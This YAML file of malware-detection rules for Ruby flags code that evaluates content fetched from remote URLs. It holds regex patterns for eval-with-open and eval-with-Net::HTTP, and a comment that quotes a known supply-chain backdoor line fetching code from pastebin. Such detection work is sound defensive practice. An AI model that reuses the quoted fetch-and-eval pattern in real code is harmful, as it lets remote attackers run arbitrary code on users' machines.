defaults:
  platforms: [windows, unix]
  for: [ruby]
traits:
  - id: eval-open-read
    desc: Evaluates code fetched from URL
    crit: suspicious
    conf: 0.9
    mbc: "B0032"
    attack: "T1059"
    unless:
      - id: metadata/package/testing/presence/harness::test-fixture-directory-path
    if:
      type: text
      regex: 'eval\s*\(?\s*(URI\.)?open\s*\(\s*["'']https?://[^)]{1,200}\)\s*\.read\s*\)?'
  - id: eval-net-http-get
    desc: Evaluates code fetched via Net::HTTP
    crit: suspicious
    conf: 0.9
    mbc: "B0032"
    attack: "T1059"
    # strong_password 0.0.7 supply-chain backdoor:
    # `eval(Net::HTTP.get(URI('https://pastebin.com/raw/…')))`
    if:
      type: text
      regex: 'eval\s*\(\s*Net::HTTP\.get\s*\('
composite_rules:
  - id: eval-remote-fetch
    desc: Evaluates code fetched from a remote URL
    crit: suspicious
    conf: 0.92
    any:
      - id: eval-open-read
      - id: eval-net-http-get
